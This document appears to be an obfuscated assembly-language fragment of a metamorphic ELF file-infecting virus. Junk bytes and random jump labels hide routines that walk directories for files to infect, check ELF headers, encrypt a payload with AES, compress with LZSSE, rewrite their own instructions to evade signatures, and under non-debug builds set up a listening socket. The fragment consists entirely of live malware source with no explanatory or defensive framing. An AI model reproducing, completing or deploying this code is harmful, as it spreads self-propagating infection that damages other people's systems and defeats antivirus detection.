    mjmp        ..@9rv3psTJ4776
..@qc9W8sE4w7c1:
    movr        rcx, rcx
    test        ecx, ecx
    mjmp        ..@Oq5Izvxf8Wcd
db 0x24, 0xea
..@Oq5Izvxf8Wcd:
    mjmp        ..@E2aR8vPooSO1
db 0xa7, 0x4e, 0xe5
..@E2aR8vPooSO1:
    mjmp        ..@B11p8XRlvj8c
db 0xa4
..@B11p8XRlvj8c:
    mjmp        ..@5oODc3JjRSqI
..@Tz0JUYDvynPY:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    mjmp        ..@T2vnnN0Htpb2
..@mRn8wWhPvibr:
%ifndef ENABLE_DEBUGGING
    cmp         al, 0x0
    jl          ..@3eMzvMToLeUr
    xor         r2, r2
    movv        rax, SYS_LISTEN
%endif
    mjmp        ..@BtSgVO6N6WmL
db 0x94, 0x61, 0x9e
..@BtSgVO6N6WmL:
    mjmp        ..@K20jZfEeTBey
..@2LNmH6PFDAQd:
%ifndef ENABLE_DEBUGGING
    movv        rax, SYS_SOCKET
%endif
    mjmp        ..@Ijq7YgEtMHSb
..@mtm44krK5aX5:
    rep         nop
    or          dl, 50h
    mov         bl, dl
    movr        rbp, rbp
    mjmp        ..@DQTtl2BE7uM2
db 0x0c, 0xf0, 0xa8
..@DQTtl2BE7uM2:
    mjmp        ..@RvZVd20wr80H
db 0x2b
..@RvZVd20wr80H:
    mjmp        ..@jX1mIw7l2Rib
..@1IjmEUh4TouZ:
    add         eax, 0x57
    mjmp        ..@d7Bm5imz0uZt
db 0x0a, 0xf6
..@d7Bm5imz0uZt:
    mjmp        ..@nt46v92xRkjf
..@3710VD3hbguo:
    jne         ..@kUhMAb8DkPxr
    mov         rax, QWORD [rsi+rcx+bytes]
    movr        rcx, rcx
    mjmp        ..@5BbQP4jZyvZP
db 0x97
..@5BbQP4jZyvZP:
    mjmp        ..@5BHk64hSZNpr
..@qPEhFpjaijaC:
    jge         ..@gjBFtsRvymPD
    mjmp        ..@677ReMHhm2gx
..@22DK4yJv4wQe:
    jbe         ..@uCkYeg5fgGzj
    mjmp        ..@mFU3MJ5XT20D
..@890VFdtH3ob1:
%ifndef ENABLE_DEBUGGING
    movr        r2, r5
%endif
    mjmp        ..@QLKiQ6dSRReX
..@tEDwSusbxzbX:
    shr         edx, 1
    test        edx, edx
    push        rbx
    mjmp        ..@a54lhLiSqRZj
db 0x0d, 0x23
..@a54lhLiSqRZj:
    mjmp        ..@lTgmDPwIKWLN
db 0x65, 0x4d, 0x26
..@lTgmDPwIKWLN:
    mjmp        ..@nNoKPSdGeqA6
..@QIkKZvIgXpXI:
    ret
    mjmp        ..@D6NbMNOj03aJ
..@NqQif1e93r2o:
    OFILE       [r5], 0x00
    cmp         eax, 0x3
    jl          ..@ofXYODv7UPud
    mov         DWORD [rsp+_KEYGEN_OFF.fd], eax
    movr        r1, rax
    mjmp        ..@55OoZz800YLk
..@LCiGeH1oBh3s:
    pop         rbp
    mjmp        ..@xuqUbzmqQSvi
db 0xa7
..@xuqUbzmqQSvi:
    mjmp        ..@UZNECCND3CUw
db 0x2c, 0xdb, 0x6d
..@UZNECCND3CUw:
    mjmp        ..@jrcE6Kzu3o47
..@EsVKhgblVSnp:
%ifdef X86_32
    cmp         edx, 9090c031h
%endif
    mjmp        ..@fxLJZuRf1wBy
..@xQ0B3j4LvSbn:
    xchg        rcx, rcx
    mov         rdi, QWORD [rsp+_AESE_OFF.keyaddr]
    xchg        rdi, rdi
    mjmp        ..@AufHi4nkVHhn
..@eYMT2uuEOLgk:
    pop         r1
    mjmp        ..@yPoG9c7nARFD
..@Gh0QsUai043y:
    call        UnmapFile
    mjmp        ..@k7XTrCott2RR
db 0xc8, 0x67
..@k7XTrCott2RR:
    mjmp        ..@XfTjyyVtIgx2
db 0x92, 0x3e, 0xe3
..@XfTjyyVtIgx2:
    mjmp        ..@GkOt1RV7VMVc
..@TkDcusK7Mqva:
    push        r5
    mjmp        ..@CHxTzsbtDaYo
db 0x2f, 0xab
..@CHxTzsbtDaYo:
    mjmp        ..@Ck0Q3bf0zlXH
..@n6X6CFNHXrfH:
    jne         ..@Xyr73yuh2B9C
    mjmp        ..@EAk0PwCQEhrE
db 0x07, 0xd0
..@EAk0PwCQEhrE:
    mjmp        ..@x9VzwMiQWiVD
db 0x27, 0x99, 0xcb
..@x9VzwMiQWiVD:
    mjmp        ..@Xyr73yuh2B9C
..@qtiQIeRJoJIb:
%ifdef X86_64
    mov         bl, 48h
%endif
    mjmp        ..@npuymsRaJ7kn
..@TQbTbidNLmRD:
    jle         ..@T2vnnN0Htpb2
    mjmp        ..@gu8uZx9Qz4UC
db 0xe0
..@gu8uZx9Qz4UC:
    mjmp        ..@WYpKAYKzebOZ
..@xUpKfzDnlvmx:
    add         eax, 0x30
    mjmp        ..@hJ7P1RB0XzwK
db 0x19, 0x3f
..@hJ7P1RB0XzwK:
    mjmp        ..@9Gc1srFpJ47y
..@vlJUKKSVQvNy:
    pop         r3
    mjmp        ..@WMeRUXJQU2hk
db 0xb2
..@WMeRUXJQU2hk:
    mjmp        ..@vaxX1rVlWAx4
..@MIdkDyh7ZecY:
    movr        r5, r3
    mjmp        ..@MJjivuA1PEYP
db 0x41
..@MJjivuA1PEYP:
    mjmp        ..@V7J0HF4ZKahm
..@G1Gfvwuipwml:
    and         eax, 0xff
    mjmp        ..@MSkYj49knIPS
db 0x6b
..@MSkYj49knIPS:
    mjmp        ..@5mgVUNAgmqJx
..@zV6XmVXntWHF:
%ifdef X86_32
    mov         bx, 0089h
%endif
    mjmp        ..@wqJ1cNmmfEtA
db 0xa2
..@wqJ1cNmmfEtA:
    mjmp        ..@H0QeYgwwMgG9
..@gFPIHdPSZ4eL:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    movr        rdx, rdx
    mjmp        ..@i8LDR0BCeIxk
db 0xcd
..@i8LDR0BCeIxk:
    mjmp        ..@FFLEVoc7tg23
db 0x61, 0xb3
..@FFLEVoc7tg23:
    mjmp        ..@tEDwSusbxzbX
..@7D1bCxnK0nZj:
    VAR         packed, procs
    mjmp        ..@OcJAf4ENbX2b
db 0xd5, 0x37
..@OcJAf4ENbX2b:
    mjmp        ..@FDwDLUHtnG4U
..@VLDQ3oGMpG5M:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    mjmp        ..@vJ1MUdI71B8n
..@2XWD9hKOUTZZ:
    test        r2, r2
    jz          ..@icuKMk8rToL9
    movr        rdx, rdx
    and         r2, 1b
    mjmp        ..@iRGbw3ElFmWI
..@RZwRcUkCODg0:
    ret
    mjmp        ConvertDoubleJumpToJump
..@2l5YHcvv9fYa:
    xor         rdx, rdx
    xor         rbx, rbx
    movv        rcx, 0c0h
    push        rdx
    mjmp        ..@6kUDiPOawJAp
db 0xae, 0x0c
..@6kUDiPOawJAp:
    mjmp        ..@aE5jxfQaSfXI
..@La3bXjkS72Yf:
    pop         rdi
    cmp         QWORD m6, 0x00
    je          ..@y1DBTlVDBAUC
    push        rdi
    pop         rdi
    mjmp        ..@P6z8VzZ3c8Wi
db 0x4b, 0x3d, 0x65
..@P6z8VzZ3c8Wi:
    mjmp        ..@EiUaHrhUDQlb
..@QTfJUVkc6aFt:
    movr        rbp, rbp
    xor         rax, rax
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    mul         rbx
    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
    mjmp        ..@X9ZG8WQY03pS
..@Uz6V5Ecbajxh:
    mov         al, dl
    mjmp        ..@ZfRGR46a2SAF
db 0x1b, 0xaa
..@ZfRGR46a2SAF:
    mjmp        ..@SK7oUyBUIqWH
..@Lt9PKkB4l21D:
    and         bl, 111b
    mjmp        ..@VCbyXD9BXQQO
..@XQDEAnZE9eeW:
    add         rsp, 0x20
    mjmp        ..@a7X2S2pxZ8rl
..@nWhkZC37pBW1:
%ifdef X86_32
    je          ..@EuaGjmwM9vTp
    cmp         dx, 00c081h
    je          ..@EuaGjmwM9vTp
    cmp         dx, 00e881h
%endif
    mjmp        ..@ZeUjdnDMYLlR
..@3y9xkc4IqKnC:
%ifdef X86_32
    xchg        rax, rax
%endif
    mjmp        ..@SjTc2W5AFs2G
..@dUtYP82VRfdk:
    xor         r1, r1
    mov         r1w, WORD [rsp+r4]
    mjmp        ..@e16uu6LQ7jYk
db 0x4e, 0xb0
..@e16uu6LQ7jYk:
    mjmp        ..@yTi294TyxsUf
db 0x4a, 0x64
..@yTi294TyxsUf:
    mjmp        ..@M9qF3waR1Jyl
db 0xb3
..@M9qF3waR1Jyl:
    mjmp        ..@4N4RPyV0SNXp
..@r1zEGOG1Ou2a:
    sub         rsp, _NBF_OFF_size
    mov         WORD [rsp+_NBF_OFF.index], r2w
    mov         QWORD [rsp+_NBF_OFF.file], r1
    lea         r1, [rsp+_NBF_OFF.key]
    mjmp        ..@Qv1lMLsHQPpK
db 0xab, 0x9b, 0xf7
..@Qv1lMLsHQPpK:
    mjmp        ..@yHnUz1Dr3C3J
DYNPIEValidation:
    mjmp        ..@TkDcusK7Mqva
..@VOENFj03P3xs:
    call        UpdateSignature
    mjmp        ..@nytngncXCEis
db 0x23
..@nytngncXCEis:
    mjmp        ..@ptVThyKXuX1G
..@PudZj1Y3QADP:
    xor         rax, rax
    ret
    mjmp        ..@a4xsXd9h6ovx
db 0xdb, 0x26, 0xf8
..@a4xsXd9h6ovx:
    mjmp        ..@oJB5iPzmr87R
db 0x4a, 0xa8
..@oJB5iPzmr87R:
    mjmp        ..@sFHQIKwsAbER
..@gL7MfDoo4Qxt:
    jne         ..@icuKMk8rToL9
    push        rdx
    pop         rdx
    xchg        rsp, rsp
    mov         r2, QWORD [r5+file.fileptr]
    mjmp        ..@6YT5ZrHRvu63
db 0x9e, 0xc7, 0x42
..@6YT5ZrHRvu63:
    mjmp        ..@qdJsRWjAlPsf
..@Ck0Q3bf0zlXH:
    push        r4
    push        r3
    mjmp        ..@m0qcYcwUWJaA
db 0x45
..@m0qcYcwUWJaA:
    mjmp        ..@WHmNqdaQBOdO
db 0x39
..@WHmNqdaQBOdO:
    mjmp        ..@RnH4u0GNkTxd
..@mAiVU8z2vA0O:
    movr        rsi, rsi
    mjmp        ..@o1KXSHTBtHp6
db 0xf0
..@o1KXSHTBtHp6:
    mjmp        ..@wOCS8lgDCJjA
..@0tAUggAdGtkP:
    mov         DWORD [rdi+8], ecx
    mjmp        ..@tOO9wjzutJB0
    mjmp        ..@8DJj6BFLEf6P
db 0xb4, 0x23
..@8DJj6BFLEf6P:
    mjmp        ..@coaG7zpVGKIA
db 0x66
..@coaG7zpVGKIA:
    mjmp        ..@AfInaYcIbiRa
..@VZzj6PLBd56h:
    or          bl, dl
    mjmp        ..@lYOtHJLkETKE
db 0xfc, 0x27, 0xfe
..@lYOtHJLkETKE:
    mjmp        ..@HAdL0Ki31Sn5
..@TThCmphP1uKc:
    push        rdx
    mjmp        ..@7DR5dUpspKWh
db 0x38, 0x60, 0x27
..@7DR5dUpspKWh:
    mjmp        ..@Tc35KovETxqS
..@mis7ttdi3vlx:
    je          ..@WlfvVz6eU9q5
    mjmp        ..@zur4nP9v46UK
..@ihLVxiQTyMRd:
%ifdef X86_64
    xchg        rbx, rbx
    mov         rsi, QWORD [r8+file.filesize]
%endif
    mjmp        ..@frZgbrQw9mWK
..@u3Xcupp1KDyn:
%ifdef X86_64
    shr         rdx, 19
%endif
    mjmp        ..@uPCJNUq4t2bi
db 0x6f, 0x38, 0xc7
..@uPCJNUq4t2bi:
    mjmp        ..@BWScqeBsRZMp
db 0x3b
..@BWScqeBsRZMp:
    mjmp        ..@GNjE2A2v5nxL
..@EuaGjmwM9vTp:
    mov         rcx, QWORD [rsp]
    mjmp        ..@D1fbgiDTjfrM
db 0x96
..@D1fbgiDTjfrM:
    mjmp        ..@k4dst9y61ZMl
..@OMjt3AZNR9xy:
    push        rdx
    pop         rdx
    mjmp        ..@9glUQQs59k3W
db 0x19
..@9glUQQs59k3W:
    mjmp        ..@BJ4FuwbvOIyf
db 0xec
..@BJ4FuwbvOIyf:
    mjmp        ..@JgSvIUGI1Xls
..@jmARv9uA1bCG:
%ifdef X86_32
    and         dx, 0f8ffh
    cmp         dx, 00c083h
    je          ..@EuaGjmwM9vTp
    cmp         dx, 00e883h
%endif
    mjmp        ..@ysbfhWDEN9Wb
db 0x02
..@ysbfhWDEN9Wb:
    mjmp        ..@nWhkZC37pBW1
..@0CA6EvpIrOSC:
    xchg        rcx, rcx
    cmp         BYTE [r1], 0x0
    mjmp        ..@yBn9Wcsixrr1
db 0x4e, 0xa1, 0x2a
..@yBn9Wcsixrr1:
    mjmp        ..@t6IvUvmT8uZK
..@pqRlma0U6EI4:
    mov         BYTE [r1], '/'
    mjmp        ..@EdBbzhAgNoH6
db 0x06
..@EdBbzhAgNoH6:
    mjmp        ..@Q5NO3KmFwaey
..@T2ONBall8Yc0:
    mov         BYTE [rdi], bl
    mjmp        ..@BiAmEMX7Um8j
db 0x1a, 0xc6, 0x0c
..@BiAmEMX7Um8j:
    mjmp        ..@prKzQ0Cu3YFE
..@ubdTXHj5ox8q:
%ifdef X86_64
    shr         rdx, 16
%endif
    mjmp        ..@icPrk1smGaOS
..@fBkIVVUFbUll:
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    mov         r3d, DWORD [rsp+_NBF_OFF.key]
    call        UpdateSignature
    mjmp        ..@pEC4lZ6NkgEw
db 0x1f, 0xd7
..@pEC4lZ6NkgEw:
    mjmp        ..@HK3Xm3capzdm
..@OhKN6rLXa0B3:
%ifdef X86_64
    jz          ..@Rlq43jz2EXQb
%endif
    mjmp        ..@rtg7Mo4nIS2P
db 0xfe
..@rtg7Mo4nIS2P:
    mjmp        ..@e2gCmS3kMPDr
db 0xe0
..@e2gCmS3kMPDr:
    mjmp        ..@MlBnMQ7GC0dA
..@Xyr73yuh2B9C:
    xor         rdx, rdx
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    sub         dl, cl
    mjmp        ..@r6HOvudSsVYu
..@tJH18hFMnide:
    cmp         dl, 0b8h
    mjmp        ..@bVnCEUXRkWhW
db 0x38, 0x4a, 0x3e
..@bVnCEUXRkWhW:
    mjmp        ..@kBWzizO5PnJT
..@T5lwYeCR0URz:
    xchg        rax, rax
    mjmp        ..@idLXiX6eUswD
..@rzkpjmM4KNdq:
    je          ..@y1DBTlVDBAUC
    mjmp        ..@6LICNppZXJ7m
..@Ti023nOjBTFp:
    add         r2, 1
    mjmp        ..@SU1b1iZ1rgje
db 0x08, 0xd6
..@SU1b1iZ1rgje:
    mjmp        ..@3FaxGfEBYnay
db 0x03, 0x67
..@3FaxGfEBYnay:
    mjmp        ..@u2uZVg71ZKHq
..@4i5cpAGfw5iy:
    mov         ecx, DWORD [rdi+1]
    sub         ecx, 1
    mov         dl, BYTE [rsp+bytes+2]
    mjmp        ..@7mjy2Y3Plaqj
db 0x69
..@7mjy2Y3Plaqj:
    mjmp        ..@euwhCA62Ebbo
..@ME9rKfvXSobd:
    sub         rcx, rsi
    cmp         rcx, 5
    ja          ..@btcETYG3iChO
    mov         WORD [rdi], 9090h
    mjmp        ..@btcETYG3iChO
..@xXR9V2JdfItu:
%ifdef X86_64
    or          bx, dx
%endif
    mjmp        ..@qydQnImeGlVu
db 0xb1, 0xed, 0x44
..@qydQnImeGlVu:
    mjmp        ..@1VYPPZq9rnTA
..@u5UqnMvcBLLv:
    mov         BYTE [r1], 0x00
    mjmp        ..@91uw8GSlNzdl
db 0x17, 0x29
..@91uw8GSlNzdl:
    mjmp        ..@RKwZyKLDOJEM
db 0x04, 0xd3
..@RKwZyKLDOJEM:
    mjmp        ..@tLQ0Zg2xjPLl
..@7ow0WTlzQQXA:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    mjmp        ..@NHIxlRYWcySu
db 0xce
..@NHIxlRYWcySu:
    mjmp        ..@FR7cpT2i3NC2
db 0xaf
..@FR7cpT2i3NC2:
    mjmp        ..@mRn8wWhPvibr
..@FEfYbTMGnkPL:
    mjmp         ..@uAofuBz19Zg9
    mjmp        ..@8xaf2LWF4NUm
..@Cu33Hb6RwFhW:
    movr        rbp, rbp
    mjmp        ..@jpkSvOEzqrI2
..@dIsOAgjUr9dX:
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    mjmp        ..@F4BuzYsgTVGU
db 0x3c, 0xd1, 0xc7
..@F4BuzYsgTVGU:
    mjmp        ..@6YU8Mvy3GbQY
..@MavS6kf0Pdgi:
    xchg        rdx, rdx
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    xor         r1, r1
    call_vsp    ExitProgram
    mjmp        ..@Wz8xATMU1Fw8
..@wVdD51lOUKoy:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    mjmp        ..@UU5xzXYCkbC4
..@VCbyXD9BXQQO:
%ifdef X86_64
    test        cl, cl
%endif
    mjmp        ..@Mxl5zmIUwuRR
..@O38BRu2yAPaO:
    mov         rsi, QWORD [rsp+bytes]
    mjmp        ..@mddElCvfR1zW
..@nlqC4td1JcAN:
    call_vsp    Aes256KeyExpansion
    mjmp        ..@6QJLFcmmer91
db 0xa5, 0xd5
..@6QJLFcmmer91:
    mjmp        ..@LCiGeH1oBh3s
..@prSPPnr9P2iu:
    ret
    mjmp        ..@qx2irD1Q1BDO
db 0xc1
..@qx2irD1Q1BDO:
    mjmp        ConvertPushPopToMove
..@cNA1uqoAMi53:
    je          ..@amSjgXHWBguE
    cmp         WORD [r1], '..'
    mjmp        ..@yyj8u27AwYsd
..@m2mwATPHYQoE:
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev+2]
    call        WORDToDWORDASCII
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    mjmp        ..@lHj9xAR9npF3
..@EeoO4KTVxis5:
    call        Strcpy
    mjmp        ..@pqRlma0U6EI4
..@KN3nnrdSowjM:
%ifdef X86_32
    and         esi, 0000ffffh
    movr        rbp, rbp
%endif
    mjmp        ..@rYzeeZSR1tXb
db 0xac
..@rYzeeZSR1tXb:
    mjmp        ..@jdVbOAIj2Kaf
db 0x4b, 0x1a, 0xd6
..@jdVbOAIj2Kaf:
    mjmp        ..@6pzWGyPmXkCQ
db 0x91, 0xb0
..@6pzWGyPmXkCQ:
    mjmp        ..@rAzq48m3K8QZ
..@hg61IGMbQ4r2:
    mov         rsi, QWORD [rsp+_AESE_OFF.startaddr]
    mjmp        ..@MrpVYsNFh0Um
..@Q5NO3KmFwaey:
    add         r1, 1
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    mjmp        ..@u5UqnMvcBLLv
..@us63wUPVz0Sh:
    xor         dl, BYTE [rsp]
    mjmp        ..@DULHA73DRfIb
..@Zl2YqFv0MPQ1:
    add         ebx, 1
    mjmp        ..@iH3M2ZW9bktJ
..@MtSe752hz7EO:
    mov         ebx, DWORD [rsi]
    mjmp        ..@zbOqVMGwa3pt
db 0x3f, 0xdc, 0x3a
..@zbOqVMGwa3pt:
    mjmp        ..@72EkkP44GUjL
..@PWOily7VlTzo:
    cmp         r4, 0x8
    jl          ..@Hie52RojKhuU
    mjmp        ..@Q4TveJQyvOff
db 0xf1
..@Q4TveJQyvOff:
    mjmp        ..@oq4AGcRg86CB
db 0x49, 0xc0, 0xd6
..@oq4AGcRg86CB:
    mjmp        ..@VW1ouzhJdNYg
db 0xc3, 0x36
..@VW1ouzhJdNYg:
    mjmp        ..@rr7uLU0IelYU
..@YcSMsr59uSud:
    je          ..@kmYN6RE2pkd3
    cmp         dl, 6ah
    mjmp        ..@P09foq8kfMtr
..@GNo3eWhmdJtS:
    push        rcx
    pop         rcx
    push        rdi
    pop         rdi
    xor         rdx, rdx
    mjmp        ..@9LqviEIcp6b6
db 0x96
..@9LqviEIcp6b6:
    mjmp        ..@yOWAjOs8pa4x
db 0xfd, 0x6e, 0x35
..@yOWAjOs8pa4x:
    mjmp        ..@hofGyxcCLRDx
..@IX6ZHFA0YMaa:
    jle         ..@5T4ajhxQz6sW
    mjmp        ..@veJk5Bw5VGdN
..@euwhCA62Ebbo:
    xchg        rax, rax
    xchg        rsi, rsi
    mjmp        ..@jJ2PEnpITutI
..@wMoQ1kzhRupQ:
    mov         BYTE [rdi], al
    mjmp        ..@MtIzEMnPGg5Z
db 0xf4, 0xc1, 0xd2
..@MtIzEMnPGg5Z:
    mjmp        ..@cyup9JysEIIj
..@hXCm0EoGTqKC:
    push        rsi
    mjmp        ..@Kf86hevYMxxs
db 0xda, 0xd9, 0x9c
..@Kf86hevYMxxs:
    mjmp        ..@IJA6egp5Byog
db 0xa6, 0x9c, 0xc8
..@IJA6egp5Byog:
    mjmp        ..@AZBTtggiGfPI
..@xwdSEKGeYxMj:
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    mjmp        ..@v69CTZzfXrzr
..@4xFiqMAZEYmQ:
    xchg        rcx, rcx
    mjmp        ..@c8eN2O8oeLCi
..@Pk7r0KITkHvi:
    ret
    mjmp        ..@HJnF31bDTPOt
db 0x63
..@HJnF31bDTPOt:
    mjmp        InfectDirectory
..@6YU8Mvy3GbQY:
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    rep         movsb
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    movr        rdi, rdi
    mjmp        ..@JVbSUAg7SWTd
..@w4tX7zCO8ph8:
    mov         edx, DWORD [rdi+rax+1]
    mjmp        ..@9Q98quBVdk59
..@TlYGRoIXqXmB:
%ifdef X86_64
    je          ..@EuaGjmwM9vTp
    cmp         edx, 00c08148h
    je          ..@EuaGjmwM9vTp
%endif
    mjmp        ..@WMNRskYBZYse
..@wmdgBVLTemsq:
    pop         rdi
    je          ..@icuKMk8rToL9
    movv        rax, 2
    mjmp        ..@UjgWhuCtsh9G
..@PDKo8lDHetx6:
    pop         rcx
    pop         rsi
    movr        rax, rax
    xor         rax, rax
    mjmp        ..@oTSwhj90Muab
db 0x0d, 0xb5, 0x04
..@oTSwhj90Muab:
    mjmp        ..@dxlZWgeYCHd4
..@0Utv1zjdsipe:
    mov         r1, QWORD [r5+file.fileptr]
    cmp         DWORD [r1], 0x464c457f
    jne         ..@tCnVPc3dgM7U
    cmp         BYTE [r1+4], ELFCLASS
    mjmp        ..@YHMaPRgNvXGw
..@DSBsVGfL7rHD:
    xor         rax, rax
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    mjmp        ..@EqWqj4wK96Mk
db 0xaa, 0x91, 0x4a
..@EqWqj4wK96Mk:
    mjmp        ..@XefqwFfUKlTQ
db 0x69
..@XefqwFfUKlTQ:
    mjmp        ..@ERYZWnze1BEE
..@xkCX0dMyLr5x:
    mjmp        ..@7P7QGBNRJhZk
    mjmp        ..@TvXOyhRCeNgg
db 0xe3, 0x13, 0xd0
..@TvXOyhRCeNgg:
    mjmp        ..@D8L8TSWQvqZl
..@Jy3c5oQlmpId:
    movr        rsi, rsi
    push        rcx
    pop         rcx
    mjmp        ..@DHWZWnKgVvQp
db 0xb0
..@DHWZWnKgVvQp:
    mjmp        ..@fqwK2uWGehIY
db 0xc4, 0xe8
..@fqwK2uWGehIY:
    mjmp        ..@04J5YQQhw4ej
..@eb7mrv3p1gFY:
    xchg        rcx, rcx
    movr        rsi, rsi
    movr        rdi, rdi
    ret
    mjmp        ..@tCnVPc3dgM7U
..@acVXBIhj8pTu:
    call        Aes256Encryption
    mjmp        ..@xWOws5tbqhY1
db 0x2e
..@xWOws5tbqhY1:
    mjmp        ..@CgQf3MvDnfWI
..@O4VEd81qAH4X:
    cmp         rax, 0xffffffffffffffff
    mjmp        ..@vtXRGFWUKZpC
..@1BLwYBwK12xm:
    mov         rbx, QWORD [rsp+_MUTA_OFF.key]
    mjmp        ..@9UXcK0HOsLv8
..@029Rn65UpHhg:
    movr        rbp, rbp
    mjmp        ..@97c7r1JjWAXX
..@VC5k82M0dzTA:
%ifdef X86_32
    pop         rcx
%endif
    mjmp        ..@ma2ifhEvPR72
db 0xd4, 0xe8
..@ma2ifhEvPR72:
    mjmp        ..@oV2LoPgUNq2W
db 0x37
..@oV2LoPgUNq2W:
    mjmp        ..@QQBKnaRneJAn
db 0x02, 0xe8
..@QQBKnaRneJAn:
    mjmp        ..@ECD07KppwEhg
..@Gzwu65znQ108:
    movv        rcx, signature_len
    mjmp        ..@qqCy6NANM6FQ
..@9Gc1srFpJ47y:
    mjmp        ..@nt46v92xRkjf
    mjmp        ..@sA5udXq3E85b
db 0x61, 0xe2
..@sA5udXq3E85b:
    mjmp        ..@1IjmEUh4TouZ
..@2ydIdc3fhVwV:
    movv        rax, SYS_MREMAP
    syscall
    mjmp        ..@DYXTRsVdG33W
db 0x06, 0x1a
..@DYXTRsVdG33W:
    mjmp        ..@gW2b4rHsgezb
..@DUrb4AGJGhzn:
    test        al, al
    jnz         ..@KCj1hdUNAVwE
    mov         r1, QWORD [r5+file.fileptr]
    movr        r3, r2
    mov         r2, QWORD [r5+file.filesize]
    mjmp        ..@17THnBcZvYog
..@NJ80ACEUyayG:
    mov         edx, DWORD [rdi]
    mjmp        ..@D7N2wO5McctW
ConvertMoveToPushPop:
    mjmp        ..@0fm4zPMQct5G
..@OfhrIXLBvjJq:
    pop         rsi
    xor         rax, rax
    mjmp        ..@Buj7JTYnJIQt
db 0xf7, 0xea, 0xc0
..@Buj7JTYnJIQt:
    mjmp        ..@QIkKZvIgXpXI
..@pgRQ3Tfd62eM:
    mov         BYTE [r1], 0x00
    mjmp        ..@LuvOBEagcXcL
db 0x3b, 0xa4
..@LuvOBEagcXcL:
    mjmp        ..@wjetFdjlZtcf
..@BqrLhAC2UWR1:
    pop         rsi
    mjmp        ..@Rb2crAtRUSTN
..@T8MxZqTUry6l:
    and         edx, 111b
    mjmp        ..@mtm44krK5aX5
..@1VYPPZq9rnTA:
%ifdef X86_64
    mjmp        ..@HAdL0Ki31Sn5
%endif
    mjmp        ..@k1f78c4cyktT
db 0x60, 0xaf
..@k1f78c4cyktT:
    mjmp        ..@uqnnNDyKjPUE
..@B37SUBZoOYCb:
    movv        r2, 1
    mjmp        ..@S10scIwnJ1Eo
..@v1g1netmTO7K:
    movr        rdi, rdi
    pop         rcx
    pop         rsi
    xor         rax, rax
    xchg        rax, rax
    mjmp        ..@tzxGP2gKiWo9
..@eNv3oSBYuzgo:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    mjmp        ..@VLDQ3oGMpG5M
..@XQ1lbcJ4C7yE:
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    mjmp        ..@FDFDT6JK3RCm
..@rQz2lFFBLqdx:
    mov         QWORD [rsp+_KEYGEN_OFF.bufferaddr], r1
    xchg        rsp, rsp
    mjmp        ..@U2FtlG5biWdK
..@KUV3dK863KfK:
    movv        rax, (-1)
    mjmp        ..@2x1Q63u1siNi
db 0xd3
..@2x1Q63u1siNi:
    mjmp        ..@TDXhdSg8CWJf
..@O7jMw1gbWgfL:
    xor         rax, rax
    xor         rdx, rdx
    mjmp        ..@pKkCD96nFQNM
..@wSz8jtew9Bzq:
    movv        rax, 0x00
    mjmp        ..@YsazrlsUETt6
db 0xe6, 0xda, 0x00
..@YsazrlsUETt6:
    mjmp        ..@WZTHXDcSGug5
..@CcP7I5VojWJa:
    mov         DWORD [rdi], eax
    mjmp        ..@DjRmTuwai70A
db 0x2f, 0x17, 0xef
..@DjRmTuwai70A:
    mjmp        ..@m2mwATPHYQoE
..@86uxbt8SMCaH:
    mov         bx, dx
    mjmp        ..@llmOfw4oHwlm
db 0x25, 0x2c
..@llmOfw4oHwlm:
    mjmp        ..@a6ywayvwy1W5
..@CoPAxFgLYq3W:
    movr        r1, rsp
    mjmp        ..@fwzRhEot1E2y
..@l7XLpgMaGUz9:
    mov         dx, WORD [rsp] 
    push        rax
    pop         rax
    mjmp        ..@KwjQNfrfAfJw
..@ExsJMswIFjlF:
    VAR         packed, procdir
    mjmp        ..@YiVGcpK275w4
db 0x4f
..@YiVGcpK275w4:
    mjmp        ..@P5l7pgdQd2b3
db 0xa9
..@P5l7pgdQd2b3:
    mjmp        ..@xwdSEKGeYxMj
..@t6IvUvmT8uZK:
    jz          ..@QGgjs47imPBM
    mjmp        ..@dq21ErnB9i77
db 0x47, 0x41
..@dq21ErnB9i77:
    mjmp        ..@pNahl2rCeg92
..@qg3uToyfgqTq:
    movr        rcx, rcx
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    mjmp        ..@sVziBnHkA8Ef
db 0xa6
..@sVziBnHkA8Ef:
    mjmp        ..@X3cn7IzjtrtP
db 0xfc
..@X3cn7IzjtrtP:
    mjmp        ..@sxFUMGTdHvgU
..@lJEa4Z6jqRsE:
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    mjmp        ..@2MKZrQennIpk
..@TuC1JTh1iEwF:
    add         rsp, _LZSSE_OFF_size
    ret
    xchg        rsp, rsp
    mjmp        ..@RuCfoG3cLyBB
db 0x34, 0x20
..@RuCfoG3cLyBB:
    mjmp        UpdateSignature
..@iFZvXpeKb8QG:
    push        rax
    mjmp        ..@tZs0Yt7FssLj
..@ItRjjfxPfYmW:
    cmp         BYTE [r1], '.'
    mjmp        ..@g66YGduRTRj7
db 0xd3, 0x4b
..@g66YGduRTRj7:
    mjmp        ..@en0GzjeQGjgC
db 0x16, 0x6f
